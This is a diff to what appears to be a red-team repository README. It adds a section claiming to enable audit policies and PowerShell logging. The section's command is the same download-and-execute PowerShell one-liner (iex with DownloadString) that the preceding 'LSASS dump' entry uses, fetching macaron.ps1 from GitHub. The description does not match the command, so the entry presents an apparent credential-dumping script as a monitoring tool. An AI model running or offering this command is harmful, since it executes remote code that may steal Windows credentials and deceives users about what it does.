@@ -48,3 +48,9 @@ Loudest LSASS dump ever
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/macaron.ps1') 
 ```
+
+## ne$e.ps1
+Enables advanced audit policies and PowerShell logging for detailed process, authentication, and privilege monitoring.
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/macaron.ps1') 
+```
